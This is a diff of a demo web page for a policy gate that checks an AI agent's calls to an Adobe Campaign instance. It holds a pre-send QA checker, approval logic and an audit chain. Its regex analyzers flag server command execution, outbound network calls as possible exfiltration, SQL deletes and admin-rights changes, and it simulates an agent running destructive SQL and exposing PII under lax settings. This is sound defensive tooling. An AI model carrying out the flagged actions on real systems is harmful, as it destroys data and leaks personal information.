+        <div class="ctl"><span class="cl">Pre-send QA</span><span class="seg" id="p-qa" role="group" aria-label="Pre-send QA"><button data-v="pass">Must pass</button><button data-v="pass_with_warnings">Warnings OK</button><button data-v="off">Off</button></span></div>
+        <div class="ctl"><label for="p-quiet">Enforce quiet hours<small>No sends 21:00–08:00 market time</small></label><span class="switch"><input type="checkbox" id="p-quiet" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-appr">Human approval for sends</label><span class="switch"><input type="checkbox" id="p-appr" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-dual">Two approvers above</label><span class="range"><input type="range" id="p-dual" min="50000" max="400000" step="10000"><output id="p-dual-o" for="p-dual"></output></span></div>
+      </div>
+      <div class="ctl-grp"><div class="gt">Workflows &amp; scripts</div>
+        <div class="ctl"><label for="p-crit">Protect compliance workflows<small>GDPR purge, unsubscribe sync</small></label><span class="switch"><input type="checkbox" id="p-crit" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-wfa">Human approval for prod workflows</label><span class="switch"><input type="checkbox" id="p-wfa" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-jsb">Block risky server JS<small>Writes, sends, egress, admin</small></label><span class="switch"><input type="checkbox" id="p-jsb" role="switch"><i></i></span></div>
+        <div class="ctl"><span class="cl">Other server JS</span><span class="seg" id="p-jsm" role="group" aria-label="Other server JS"><button data-v="dry_run">Dry run</button><button data-v="allow">Execute</button></span></div>
+      </div>
+      <div class="ctl-grp"><div class="gt">Session</div>
+        <div class="ctl"><label for="p-wl">Write calls per session</label><select class="sel" id="p-wl"><option value="3">3</option><option value="6">6</option><option value="50">50</option></select></div>
+        <div class="ctl"><label for="p-kill">Kill switch<small>Blocks every write</small></label><span class="switch"><input type="checkbox" id="p-kill" role="switch"><i></i></span></div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:16px;min-width:0">
+      <div class="card">
+        <div class="verdict" id="verdict"></div>
+        <div class="outgrid" id="outgrid"></div>
+        <div class="meter" style="margin-top:14px">
+          <div class="lbl"><span>Sent <b id="l-sent">0</b></span><span>Defective sends <b id="l-def">0</b></span><span>Held <b id="l-held">0</b></span></div>
+          <div class="track" id="l-track"></div>
+        </div>
+        <p class="diffnote" id="diffnote"></p>
+      </div>
+      <div class="toolbar" role="group" aria-label="Filter calls">
+        <button class="qf" data-f="all" aria-pressed="true">All</button>
+        <button class="qf" data-f="block" aria-pressed="false">Blocked</button>
+        <button class="qf" data-f="human" aria-pressed="false">Human loop</button>
+        <button class="qf" data-f="ran" aria-pressed="false">Ran</button>
+        <button class="qf" data-f="changed" aria-pressed="false">Changed</button>
+        <button class="btn btn-accent btn-sm" id="play">▶ Replay</button>
+      </div>
+      <div class="log" id="log"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ PLAYGROUND -->
+<section id="playground">
+  <div class="sec-head">
+    <span class="kicker">Playground</span>
+    <h2>Submit your own call to the gate</h2>
+    <p class="sub">Write SQL or server-side JavaScript, request a send or a workflow action. The gate uses whatever policy is set in the lab, and every decision is hashed into a live audit chain.</p>
+  </div>
+  <div class="pg">
+    <div class="card">
+      <div class="tabs" role="tablist" aria-label="Call type">
+        <button role="tab" id="tab-sql" aria-selected="true" aria-controls="pane-sql">Query (SQL)</button>
+        <button role="tab" id="tab-js" aria-selected="false" aria-controls="pane-js">Server JS</button>
+        <button role="tab" id="tab-send" aria-selected="false" aria-controls="pane-send">Send delivery</button>
+        <button role="tab" id="tab-wf" aria-selected="false" aria-controls="pane-wf">Workflow</button>
+      </div>
+      <div class="pane" id="pane-sql" role="tabpanel" aria-labelledby="tab-sql">
+        <div class="chips" data-for="ed-sql"></div>
+        <textarea class="ed" id="ed-sql" spellcheck="false" aria-label="SQL"></textarea>
+      </div>
+      <div class="pane" id="pane-js" role="tabpanel" aria-labelledby="tab-js" hidden>
+        <div class="chips" data-for="ed-js"></div>
+        <textarea class="ed" id="ed-js" spellcheck="false" aria-label="Server-side JavaScript"></textarea>
+      </div>
+      <div class="pane" id="pane-send" role="tabpanel" aria-labelledby="tab-send" hidden>
+        <div class="fields"><label class="field">Delivery<select id="pg-del"></select></label><div class="field">QA right now<span id="pg-delqa" style="padding-top:6px"></span></div></div>
+      </div>
+      <div class="pane" id="pane-wf" role="tabpanel" aria-labelledby="tab-wf" hidden>
+        <div class="fields"><label class="field">Workflow<select id="pg-wf"></select></label><label class="field">Action<select id="pg-act"><option value="start">start</option><option value="pause">pause</option><option value="stop">stop</option></select></label></div>
+      </div>
+      <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap"><button class="btn btn-accent" id="submit">Submit to gate</button><button class="btn btn-sec" id="reset">Reset session</button></div>
+      <div class="result" id="pg-result" style="margin-top:16px"><div class="empty">Pick a preset or write your own, then submit.</div></div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:16px;min-width:0">
+      <div class="card" id="approvals" style="scroll-margin-top:72px">
+        <h3>Approval inbox</h3>
+        <p class="hint">Requests waiting for a person. Approve as different roles to see role checks, dual sign-off and the re-check at execution time.</p>
+        <div class="inbox" id="inbox" style="margin-top:12px"></div>
+      </div>
+      <div class="card">
+        <h3>Live audit chain</h3>
+        <p class="hint">SHA-256 of each entry includes the previous hash, computed in your browser.</p>
+        <div class="livechain" id="livechain" style="margin-top:10px"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ QA -->
+<section id="qa">
+  <div class="sec-head">
+    <span class="kicker">Pre-send QA board</span>
+    <h2>Four of eight markets would have shipped a defect</h2>
+    <p class="sub">Checks follow Adobe’s own pre-send guidance <a class="ref" href="#src-3">[3]</a><a class="ref" href="#src-4">[4]</a><a class="ref" href="#src-5">[5]</a><a class="ref" href="#src-7">[7]</a><a class="ref" href="#src-8">[8]</a>. Select any cell for the detail. Apply a fix and the lab and playground re-run against the corrected delivery.</p>
+  </div>
+  <div class="tablewrap"><table class="qa" id="board"></table></div>
+  <div class="card qadetail" id="qadetail"></div>
+</section>
+
+<!-- ============ AUDIT -->
+<section id="audit">
+  <div class="sec-head">
+    <span class="kicker">Audit log</span>
+    <h2>Forge any entry and the chain gives it away</h2>
+    <p class="sub">The recorded session wrote 34 entries, blocked calls included. Select an entry to rewrite its decision, as someone hiding a mistake might. Every entry after it stops verifying.</p>
+  </div>
+  <div class="audit">
+    <div class="card"><div class="chain" id="chain"></div></div>
+    <div class="card">
+      <div class="hint" style="margin:0;font-family:var(--mono)">verify(audit.jsonl)</div>
+      <div class="vstate ok" id="vstate">Chain intact</div>
+      <p class="hint" id="vtext"></p>
+      <button class="btn btn-sec btn-sm" id="restore" style="margin-top:12px" hidden>Restore original log</button>
+    </div>
+  </div>
+</section>
+
+<!-- ============ POLICY -->
+<section id="policy">
+  <div class="sec-head">
+    <span class="kicker">Policy file</span>
+    <h2>Rules live in a reviewed file, not in a prompt</h2>
+    <p class="sub">This file follows the lab. Lines you changed are highlighted.</p>
+  </div>
+  <div class="pol">
+    <pre class="yaml" id="yaml" tabindex="0" aria-label="policy/default.yaml"></pre>
+    <div class="card"><ul class="principles">
+      <li><span class="i">01</span><div><b>Fail closed</b><span>A tool not in the policy is blocked. New capabilities are opt-in.</span></div></li>
+      <li><span class="i">02</span><div><b>Anything that looks like a write is a write</b><span>Pattern analyzers over-block on purpose. A false positive costs one click; a false negative costs a market.</span></div></li>
+      <li><span class="i">03</span><div><b>Re-check at execution time</b><span>If a proof is withdrawn while a send waits for sign-off, the approved send is still stopped.</span></div></li>
+      <li><span class="i">04</span><div><b>Separation of duties</b><span>Role-checked approvers, two people above a volume threshold, nobody approves twice.</span></div></li>
+      <li><span class="i">05</span><div><b>Defence in depth</b><span>Operator groups and named rights stay the outer wall <a class="ref" href="#src-6">[6]</a>. The gate adds intent checks those rights cannot express.</span></div></li>
+    </ul></div>
+  </div>
+</section>
+
+<!-- ============ SOURCES -->
+<section id="sources">
+  <div class="sec-head">
+    <span class="kicker">Sources</span>
+    <h2>Grounded in Adobe Experience League</h2>
+    <p class="sub">Adobe’s documentation names the capabilities and the checks. Where it is silent, such as which agent capabilities are read-only, the gate assumes the worst case.</p>
+  </div>
+  <ol class="sources" id="srclist"></ol>
+</section>
+
+<footer>
+  <span><b>ACC Agent Gate</b> · Python MCP server · 24 tests · built by Sangram Ghatge</span>
+  <span>Independent project with a Spectrum-inspired look. Not affiliated with or endorsed by Adobe. All data is synthetic.</span>
+</footer>
+</main>
+</div>
+
+<script>
+const DATA = __DATA__;
+const $ = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+const fmt = n => Number(n).toLocaleString("en-US");
+const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const clone = o => JSON.parse(JSON.stringify(o));
+const LABEL = {allow:"Allowed",allow_masked:"Masked",dry_run:"Dry run",needs_approval:"Needs approval",block:"Blocked",approved:"Approved",partial_approval:"1 of 2 signed",rejected:"Rejected"};
+const RISKC = r => r>=85?"var(--negative)":r>=60?"var(--notice)":r>=30?"var(--purple)":"var(--positive)";
+const PII = new Set(["@email","@mobilePhone","@firstName","@lastName","@birthDate","@address"]);
+const MK = DATA.markets;
+
+/* ================= policy state ================= */
+const P0 = DATA.policy;
+const DEFAULT = {
+  mask_pii: P0.data.mask_pii, block_sql_writes: P0.tools["query.run"].block_sql_writes,
+  max_rows: P0.session_limits.max_rows_per_query, require_qa: P0.tools["delivery.send"].require_qa,
+  quiet: true, send_approval: true, dual_over: P0.tools["delivery.send"].dual_approval_over,
+  block_critical: P0.tools["workflow.control"].block_critical, wf_approval: true,
+  js_block: true, js_mode: P0.tools["js.execute"].mode, max_writes: P0.session_limits.max_write_calls,
+  kill_switch: P0.kill_switch
+};
+const PRESETS = {
+  recommended: {...DEFAULT},
+  humans: {...DEFAULT, require_qa:"off", quiet:false, block_critical:false, js_block:false, js_mode:"dry_run"},
+  autopilot: {...DEFAULT, mask_pii:false, block_sql_writes:false, max_rows:100000, require_qa:"off", quiet:false,
+    send_approval:false, block_critical:false, wf_approval:false, js_block:false, js_mode:"allow", max_writes:50},
+  lockdown: {...DEFAULT, kill_switch:true},
+};
+let policy = {...DEFAULT};
+
+/* ================= instance state (QA fixes) ================= */
+const BASE_DELIVERIES = DATA.deliveries;
+const fixes = new Set(); // "DM_BF26_SI:unsubscribe_link"
+function deliveriesNow(){
+  return BASE_DELIVERIES.map(d0 => {
+    const d = clone(d0);
+    const has = id => fixes.has(d.id + ":" + id);
+    if (has("unsubscribe_link") && !d.body.includes("UnsubscriptionLink"))
+      d.body = d.body.replace("</footer>", "<a href='<%@ include view='UnsubscriptionLink' %>'>Unsubscribe</a></footer>");
+    if (has("price_locale")) d.body = d.body.replace("€1,299.00", "1.299,00 €");
+    if (has("send_window")) d.scheduled_local = d.scheduled_local.split(" ")[0] + " 10:00";
+    if (has("proof_sent")) d.proof_sent = true;
+    if (has("consent_filter")) d.consent_filter = true;
+    if (has("subject_length")) d.subject = d.subject.split(" – ")[0];
+    if (has("seed_list")) d.seed_list = true;
+    return d;
+  });
+}
+
+/* ================= QA (port of qa.py) ================= */
+const PRICE_RE = /(€\s?\d[\d.,\s]*\d|\d[\d.,\s]*\d\s?(€|RSD|Ft|Kč))/g;
+const QA_META = {
+  unsubscribe_link:["Unsubscribe link","Unsub link","blocker"], legal_footer:["Market legal footer","Legal footer","blocker"],
+  price_locale:["Price & currency locale","Price locale","blocker"], consent_filter:["Marketing-consent filter","Consent filter","blocker"],
+  proof_sent:["Proof sent & signed off","Proof","blocker"], send_window:["Outside local quiet hours","Quiet hours","blocker"],
+  typology:["Marketing typology applied","Typology","blocker"], seed_list:["Seed list attached","Seed list","warning"],
+  subject_length:["Subject ≤ 50 characters","Subject ≤50","warning"],
+};
+const FIXABLE = new Set(["unsubscribe_link","price_locale","send_window","proof_sent","consent_filter","subject_length","seed_list"]);
+function runQA(d, pol){
+  const m = MK[d.market], R = [];
+  const add = (id, ok, detail) => R.push({id, label:QA_META[id][0], severity:QA_META[id][2], passed:ok, detail});
+  add("unsubscribe_link", d.body.includes("UnsubscriptionLink"), d.body.includes("UnsubscriptionLink") ? "Unsubscribe block found in the body" : "No unsubscribe link in the body. This is a legal blocker in every EU market.");
+  const foot = d.body.includes("<footer>") && d.body.includes("Legal entity " + d.market);
+  add("legal_footer", foot, foot ? "Footer names the " + m.name + " legal entity" : "Footer missing or not localised for " + m.name);
+  const prices = (d.body.match(PRICE_RE) || []).map(p => p.trim()); const bad = [];
+  prices.forEach(p => { const dg = p.replace(/[^\d.,]/g, "");
+    if (m.decimal === "," && /\.\d{2}$/.test(dg)) bad.push(p);
+    if (!m.symbol_after && p.endsWith("€")) bad.push(p);
+    if (m.symbol_after && p.startsWith("€")) bad.push(p); });
+  const pok = prices.length > 0 && bad.length === 0;
+  add("price_locale", pok, pok ? "Prices match the " + m.name + " format: " + prices.join(", ") : "Price not in " + m.name + " format: " + [...new Set(bad)].join(", ") + ". Expected decimal comma and the symbol after the amount.");
+  add("consent_filter", d.consent_filter, d.consent_filter ? "Target excludes recipients without marketing consent" : "Target does not filter on marketing consent. GDPR exposure.");
+  add("proof_sent", d.proof_sent, d.proof_sent ? "Proof sent and approved" : "No proof sent. The market owner has not seen the final render.");
+  const h = +d.scheduled_local.split(" ")[1].split(":")[0];
+  const inQuiet = pol.quiet && (h >= 21 || h < 8);
+  add("send_window", !inQuiet, "Scheduled " + d.scheduled_local + " local time" + (inQuiet ? ", inside 21:00–08:00 quiet hours" : pol.quiet ? "" : " (quiet hours not enforced)"));
+  add("typology", d.typology.startsWith("TY_MARKETING"), "Typology " + d.typology);
+  add("seed_list", d.seed_list, d.seed_list ? "Seed list attached" : "No seed addresses, so inbox monitoring is blind");
+  add("subject_length", d.subject.length <= 50, d.subject.length + " characters: “" + d.subject + "”" + (d.subject.length > 50 ? ". Adobe recommends 50 or fewer; long subjects truncate on mobile and in AI inbox summaries." : ""));
+  const blockers = R.filter(r => !r.passed && r.severity === "blocker").map(r => r.id);
+  const warnings = R.filter(r => !r.passed && r.severity === "warning").map(r => r.id);
+  return {delivery:d.id, market:d.market, checks:R, blockers, warnings, passed:R.filter(r=>r.passed).length, total:R.length,
+          status: blockers.length ? "fail" : warnings.length ? "pass_with_warnings" : "pass"};
+}
+
+/* ================= analyzers (port of analyzers.py) ================= */
+const JS_RULES = [
+  [/xtk\.session\.Write(Collection)?\s*\(/, "write", "xtk.session.Write: bulk entity write"],
+  [/\bsqlExec\s*\(/, "write", "sqlExec: raw SQL execution"],
+  [/\.(Delete|DeleteCollection)\s*\(/, "write", "Delete call on an entity"],
+  [/nms\.delivery\.(Start|Prepare|SubmitDelivery)|\bSubmitDelivery\s*\(/, "send", "Starts or submits a delivery"],
+  [/xtk\.workflow\.(Start|Stop|Kill|PostEvent)/, "workflow", "Controls a workflow"],
+  [/\bexecCommand\s*\(|\bxtk\.fileRes|\bFile\s*\(/, "system", "Server command or file system access"],
+  [/\bHttpClientRequest\b|\bhttps?:\/\//, "egress", "Outbound network call: possible data exfiltration"],
+  [/xtk\.operator|xtk\.opsecurity|setOption\s*\(/, "admin", "Operator rights or instance options"],
+];
+function analyzeJS(s){
+  const cats = new Set(), f = [];
+  JS_RULES.forEach(([re,k,d]) => { if (re.test(s)) { cats.add(k); f.push(d); } });
+  if (!f.length && /xtk\.queryDef\.create|\.ExecuteQuery\s*\(|logInfo\s*\(/i.test(s)) f.push("queryDef read only");
+  return {cats, findings:f};
+}
+function analyzeSQL(s){
+  const hits = [...new Set((s.match(/\b(INSERT|UPDATE|DELETE|MERGE|TRUNCATE|DROP|ALTER|CREATE|GRANT|REVOKE)\b/gi) || []).map(x => x.toUpperCase()))];
+  const f = hits.length ? ["SQL write keyword(s): " + hits.join(", ")] : [];
+  if (/\b(DELETE|UPDATE)\b/i.test(s) && !/\bWHERE\b/i.test(s)) f.push("No WHERE clause: full-table change");
+  return {write: hits.length > 0, findings: f};
+}
+
+/* ================= gate (port of gate.py) ================= */
+const D = (decision, rule, reason, risk, extra = {}) => ({decision, rule, reason, risk, ...extra});
+function evaluate(tool, args, ctx){
+  const pol = ctx.policy;
+  const known = ["campaign.discover","schema.browse","query.run","delivery.qa","delivery.send","workflow.control","js.execute"];
+  if (!known.includes(tool)) return D("block","fail_closed","Tool '" + tool + "' is not in the policy, so it fails closed",95);
+  if (tool === "delivery.send" || tool === "workflow.control"){
+    if (pol.kill_switch) return D("block","kill_switch","Kill switch is on: every write is halted",99);
+    if (ctx.writes >= pol.max_writes) return D("block","session_write_limit","Session already used " + ctx.writes + "/" + pol.max_writes + " write calls",85);
+  }
+  if (tool === "query.run"){
+    if (args.sql){
+      const a = analyzeSQL(args.sql);
+      if (a.write && pol.block_sql_writes) return D("block","query.run.block_sql_writes","Query tool used for a write. " + a.findings.join(". "),95,{findings:a.findings, alt:"Write the clean-up as a reviewed stage workflow. The agent can draft it; a human deploys it."});
+      if (a.write) return D("allow","query.run.mode","SQL write passed through because write blocking is off",95,{findings:a.findings, unsafe:"Destructive SQL executed: " + args.sql});
+      return D("allow","query.run.mode","Read-only SQL",5,{findings:["read-only"]});
+    }
+    const lim = +(args.limit || 100);
+    if (lim > pol.max_rows) return D("block","session_limits.max_rows_per_query","Requested " + fmt(lim) + " rows; the cap is " + fmt(pol.max_rows),70,{alt:"Use an aggregate (group_by) instead of a row-level export."});
+    const touched = (args.select || []).filter(f => PII.has(f));
+    const rows = rowCount(args, lim);
+    if (touched.length && pol.mask_pii) return D("allow_masked","data.mask_pii","PII masked before the agent sees it: " + touched.join(", "),20,{rows});
+    if (touched.length) return D("allow","query.run.mode","Returned " + fmt(rows) + " rows with readable " + touched.join(", "),75,{rows, unsafe:"Unmasked PII returned to the agent (" + fmt(rows) + " rows)", pii:rows});
+    return D("allow","query.run.mode","Read-only query within limits",5);
+  }
+  if (tool === "delivery.send"){
+    const d = ctx.deliveries.find(x => x.id === args.delivery_id);
+    if (!d) return D("block","delivery.unknown","Unknown delivery",80);
+    const qa = runQA(d, pol);
+    if (pol.require_qa !== "off"){
+      const ok = pol.require_qa === "pass" ? ["pass"] : ["pass","pass_with_warnings"];
+      if (!ok.includes(qa.status)) return D("block","delivery.send.require_qa","QA " + qa.status.replace(/_/g," ") + ": " + (qa.blockers.length ? qa.blockers : qa.warnings).map(i=>QA_META[i][1]).join(", "),92,{qa, alt:"Fix the listed checks, re-run delivery.qa, then request the send again."});
+    }
+    const qaTxt = pol.require_qa === "off" ? "QA not enforced" : "QA " + qa.status.replace(/_/g," ");
+    if (!pol.send_approval) return D("allow","delivery.send.mode",qaTxt + "; sends run without a human",qa.status === "fail" ? 90 : 40,{qa});
+    const n = d.target_count > pol.dual_over ? 2 : 1;
+    return D("needs_approval","delivery.send.approval",qaTxt + "; " + fmt(d.target_count) + " recipients in " + MK[d.market].name + " need " + (n === 2 ? "two approvers" : "one approver"),65,{qa, n});
+  }
+  if (tool === "workflow.control"){
+    const w = DATA.workflows.find(x => x.internal_name === args.workflow);
+    if (!w) return D("block","workflow.unknown","Unknown workflow",80);
+    if (w.critical && pol.block_critical) return D("block","workflow.control.block_critical",w.internal_name + " is a protected compliance workflow (" + w.label + ")",98,{alt:"Raise an incident with the platform owner. Agents never touch it."});
+    if (w.environment === "stage") return D("allow","workflow.control.stage_environment","Stage workflow: allowed",15);
+    if (pol.wf_approval) return D("needs_approval","workflow.control.mode","'" + args.action + "' on production workflow " + w.internal_name,w.critical ? 90 : 70,{n:1});
+    return D("allow","workflow.control.mode","Production workflow action without approval",w.critical ? 95 : 60);
+  }
+  if (tool === "js.execute"){
+    const a = analyzeJS(args.script);
+    const risky = ["write","send","workflow","system","egress","admin"].filter(c => a.cats.has(c));
+    if (risky.length && pol.js_block) return D("block","js.execute.block_categories","Script performs " + risky.join(", ") + ": " + a.findings.join("; "),97,{findings:a.findings, alt:"Express the intent as a query or a QA check. Data changes go through a reviewed workflow."});
+    if (pol.js_mode === "allow") return D("allow","js.execute.mode","Executed on the instance: " + (a.findings.join("; ") || "no findings"),risky.length ? 97 : 30,{findings:a.findings, unsafe: risky.length ? "Server JS executed with " + risky.join(", ") : null});
+    return D("dry_run","js.execute.mode","Analysed, not executed: " + (a.findings.join("; ") || "no risky patterns"),35,{findings:a.findings});
+  }
+  return D("allow",tool + ".mode","Read-only: allowed by policy",5);
+}
+function rowCount(args, lim){
+  const c = args.where && args.where["@country"];
+  const total = c ? (DATA.recipients.by_country[c] || 0) : DATA.recipients.total;
+  return Math.min(lim, total);
+}
+function execEffects(tool, args, ctx, out){
+  if (tool === "delivery.send"){
+    ctx.writes++;
+    const d = ctx.deliveries.find(x => x.id === args.delivery_id);
+    d.state = "sent";
+    const qa = runQA(d, {...ctx.policy, quiet:true});
+    out.sent.push({id:d.id, market:d.market, volume:d.target_count, defective: qa.blockers.length > 0, blockers: qa.blockers});
+    return "Sent to " + fmt(d.target_count) + " recipients in " + MK[d.market].name + (qa.blockers.length ? " with defects: " + qa.blockers.map(i=>QA_META[i][1]).join(", ") : "");
+  }
+  if (tool === "workflow.control"){
+    ctx.writes++;
+    const w = DATA.workflows.find(x => x.internal_name === args.workflow);
+    if (w.critical) out.damage.push(w.label + " " + args.action + "d by the agent");
+    return w.internal_name + " → " + ({start:"started",pause:"paused",stop:"stopped"}[args.action] || args.action);
+  }
+  if (tool === "js.execute"){ ctx.writes++; return "Script executed on the instance"; }
+  return null;
+}
+
+/* ================= session simulation ================= */
+function outcomeText(tool, args, dec){
+  if (dec.decision === "block") return dec.alt || "Stopped before reaching Campaign";
+  if (dec.decision === "dry_run") return "Analysed only. Nothing ran on the instance.";
+  if (tool === "campaign.discover") return "aurora-mkt-prod: 8 markets, 8 deliveries, 4 workflows";
+  if (tool === "schema.browse") return "11 fields, 6 flagged as PII";
+  if (tool === "query.run" && args.group_by) return fmt(DATA.recipients.total) + " recipients across 8 markets (aggregate only)";
+  if (tool === "query.run" && args.sql) return dec.unsafe ? "Rows deleted on production" : "Query ran";
+  if (tool === "query.run") return fmt(dec.rows || 0) + " rows returned" + (dec.decision === "allow_masked" ? ", e.g. i***@example.test" : "");
+  if (tool === "delivery.qa") { const q = dec.qa; return q.status.replace(/_/g, " ") + ": " + q.passed + "/" + q.total + " checks"; }
+  return "Done";
+}
+function simulate(pol){
+  const ctx = {policy:pol, writes:0, deliveries:deliveriesNow().map(d => ({...d, state:"ready"}))};
+  const out = {steps:[], sent:[], damage:[], pii:0, counts:{allow:0,allow_masked:0,dry_run:0,needs_approval:0,block:0}};
+  let seq = 0;
+  DATA.script.forEach((s, i) => {
+    let dec = evaluate(s.tool, s.args, ctx);
+    if (s.tool === "delivery.qa") dec = {...D("allow","delivery.qa.mode","Read-only: allowed by policy",5), qa: runQA(ctx.deliveries.find(x => x.id === s.args.delivery_id), pol)};
+    out.counts[dec.decision]++;
+    const step = {seq:++seq, idx:i, actor:"agent", phase:s.phase, tool:s.tool, args:s.args, intent:s.intent, ...dec, outcome:outcomeText(s.tool, s.args, dec)};
+    out.steps.push(step);
+    if (dec.unsafe) out.damage.push(dec.unsafe);
+    if (dec.pii) out.pii += dec.pii;
+    if (dec.decision === "allow"){ const t = execEffects(s.tool, s.args, ctx, out); if (t) step.outcome = t; }
+    if (dec.decision === "needs_approval"){
+      step.outcome = "Queued for " + (dec.n === 2 ? "two approvers" : "one approver");
+      const isReminder = s.tool === "workflow.control" && s.args.workflow === "WKF_BF26_Reminder";
+      if (isReminder){
+        out.steps.push({seq:++seq, actor:"human", phase:s.phase, tool:s.tool, who:"crm.ops.lead", role:"CRM ops lead", decision:"rejected", reason:"Reminder audience depends on day-1 results", outcome:"Rejected: schedule after the day-1 review", risk:0});
+      } else {
+        const people = s.tool === "delivery.send" ? [["market.owner." + s.args.delivery_id.slice(-2).toLowerCase(),"Market owner"],["crm.ops.lead","CRM ops lead"]] : [["crm.ops.lead","CRM ops lead"]];
+        for (let k = 0; k < (dec.n || 1); k++){
+          const last = k === (dec.n || 1) - 1;
+          let o = (k + 1) + "/" + (dec.n || 1) + " approvals";
+          if (last){
+            const re = evaluate(s.tool, s.args, ctx);
+            o = re.decision === "block" ? "Blocked on re-check: " + re.reason : execEffects(s.tool, s.args, ctx, out);
+          }
+          out.steps.push({seq:++seq, actor:"human", phase:s.phase, tool:s.tool, who:people[k][0], role:people[k][1], decision:last ? "approved" : "partial_approval", reason:"Approves the queued request", outcome:o, risk:0});
+        }
+      }
+    }
+  });
+  const sentIds = new Set(out.sent.map(x => x.id));
+  out.sentVol = out.sent.reduce((a,b) => a + b.volume, 0);
+  out.defVol = out.sent.filter(x => x.defective).reduce((a,b) => a + b.volume, 0);
+  out.heldVol = ctx.deliveries.filter(d => !sentIds.has(d.id)).reduce((a,b) => a + b.target_count, 0);
+  out.sentIds = sentIds;
+  out.sent.filter(x => x.defective).forEach(x => out.damage.unshift(MK[x.market].name + " sent to " + fmt(x.volume) + " with " + x.blockers.map(i => QA_META[i][1].toLowerCase()).join(", ") + " defect"));
+  return out;
+}
+
+/* ================= overview ================= */
+const BASE = simulate(PRESETS.recommended);
+(function overview(){
+  const c = BASE.counts, ran = c.allow + c.allow_masked;
+  $("#h-calls").textContent = DATA.script.length; $("#h-ran").textContent = ran; $("#h-dry").textContent = c.dry_run;
+  $("#h-hold").textContent = c.needs_approval; $("#h-block").textContent = c.block;
+  const k = [["Agent tool calls", DATA.script.length, ""], ["Blocked before production", c.block, "s-block"], ["Sent to a human", c.needs_approval, "s-needs_approval"], ["Unmasked PII rows seen", BASE.pii, "s-allow"]];
+  $("#kpis").innerHTML = k.map(([l,n,s]) => `<div class="kpi"><div class="l">${l}</div><div class="n">${n}</div>${s ? `<span class="sl ${s}">${s === "s-allow" ? "Zero exposure" : s === "s-block" ? "Stopped by policy" : "Queued for sign-off"}</span>` : `<span class="sl">8 markets · 1 brief</span>`}</div>`).join("");
+  const tot = BASE.sentVol + BASE.heldVol;
+  $("#m-sent").textContent = fmt(BASE.sentVol); $("#m-held").textContent = fmt(BASE.heldVol);
+  $("#m-track").innerHTML = `<span style="width:${BASE.sentVol/tot*100}%;background:var(--positive)"></span><span style="width:${BASE.heldVol/tot*100}%;background:var(--negative)"></span>`;
+})();
+
+/* ================= lab UI ================= */
+function bindControls(){
+  const sw = {"p-mask":"mask_pii","p-sql":"block_sql_writes","p-quiet":"quiet","p-appr":"send_approval","p-crit":"block_critical","p-wfa":"wf_approval","p-jsb":"js_block","p-kill":"kill_switch"};
+  Object.entries(sw).forEach(([id,k]) => { const el = $("#" + id); el.checked = !!policy[k]; el.setAttribute("aria-checked", el.checked); });
+  $("#p-rows").value = String(policy.max_rows); $("#p-wl").value = String(policy.max_writes);
+  $("#p-dual").value = policy.dual_over; $("#p-dual-o").textContent = fmt(policy.dual_over);
+  $$("#p-qa button").forEach(b => b.setAttribute("aria-pressed", b.dataset.v === policy.require_qa));
+  $$("#p-jsm button").forEach(b => b.setAttribute("aria-pressed", b.dataset.v === policy.js_mode));
+  const match = Object.entries(PRESETS).find(([,p]) => Object.keys(p).every(k => p[k] === policy[k]));
+  $$(".preset").forEach(b => b.setAttribute("aria-pressed", !!match && b.dataset.preset === match[0]));
+  $("#p-dual").disabled = !policy.send_approval;
+}
+function wire(){
+  const sw = {"p-mask":"mask_pii","p-sql":"block_sql_writes","p-quiet":"quiet","p-appr":"send_approval","p-crit":"block_critical","p-wfa":"wf_approval","p-jsb":"js_block","p-kill":"kill_switch"};
+  Object.entries(sw).forEach(([id,k]) => $("#" + id).addEventListener("change", e => { policy[k] = e.target.checked; refresh(); }));
+  $("#p-rows").addEventListener("change", e => { policy.max_rows = +e.target.value; refresh(); });
+  $("#p-wl").addEventListener("change", e => { policy.max_writes = +e.target.value; refresh(); });
+  $("#p-dual").addEventListener("input", e => { policy.dual_over = +e.target.value; refresh(); });
+  $$("#p-qa button").forEach(b => b.addEventListener("click", () => { policy.require_qa = b.dataset.v; refresh(); }));
+  $$("#p-jsm button").forEach(b => b.addEventListener("click", () => { policy.js_mode = b.dataset.v; refresh(); }));
+  $$(".preset").forEach(b => b.addEventListener("click", () => { policy = {...PRESETS[b.dataset.preset]}; refresh(); }));
+}
+let SIM = BASE, filter = "all";
+function renderLab(){
+  const S = SIM, c = S.counts, ran = c.allow + c.allow_masked;
+  const safe = S.damage.length === 0 && S.pii === 0;
+  $("#verdict").className = "verdict " + (safe ? "ok" : "bad");
+  $("#verdict").innerHTML = safe
+    ? `<span class="ic">✓</span><div><h3>No harm reached production</h3><ul><li>${fmt(S.sentVol)} recipients sent, all QA-clean</li><li>0 unmasked PII rows, 0 destructive actions</li></ul></div>`
+    : `<span class="ic">!</span><div><h3>${S.damage.length} harmful outcome${S.damage.length === 1 ? "" : "s"} under this policy</h3><ul>${S.damage.map(x => `<li>${esc(x)}</li>`).join("")}</ul></div>`;
+  const b = BASE.counts, items = [["Ran", ran, b.allow + b.allow_masked, "s-allow"], ["Human", c.needs_approval, b.needs_approval, "s-needs_approval"], ["Blocked", c.block, b.block, "s-block"], ["Dry run", c.dry_run, b.dry_run, "s-dry_run"]];
+  $("#outgrid").innerHTML = items.map(([l,n,base,s]) => { const d = n - base;
+    return `<div class="og"><span class="sl ${s}">${l}</span><div class="n">${n}${d ? `<span class="d ${(l === "Blocked" || l === "Human") === d > 0 ? "d-down" : "d-up"}">${d > 0 ? "+" : ""}${d}</span>` : ""}</div></div>`; }).join("");
+  const tot = S.sentVol + S.heldVol || 1, clean = S.sentVol - S.defVol;
+  $("#l-sent").textContent = fmt(S.sentVol); $("#l-def").textContent = fmt(S.defVol); $("#l-held").textContent = fmt(S.heldVol);
